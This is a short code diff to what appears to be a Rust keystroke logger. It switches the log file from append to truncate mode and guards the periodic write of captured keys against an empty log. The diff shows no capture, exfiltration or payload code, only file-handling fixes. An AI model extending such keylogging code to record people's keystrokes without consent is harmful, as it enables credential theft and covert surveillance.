@@ -45,7 +45,7 @@ impl KeyLog {
     fn to_file(&self, path: &str, password: &str) {
         let mut file = OpenOptions::new()
             .write(true)
-            .append(true)
+            .truncate(true)
             .create(true)
             .open(path)
             .unwrap();
@@ -142,7 +142,7 @@ pub fn log_keys(
             break;
         }
 
-        if log.len() % 1000 == 0 {
+        if log.len() != 0 && log.len() % 1000 == 0 {
             log.to_file(&out_path, &password);
         }
     }
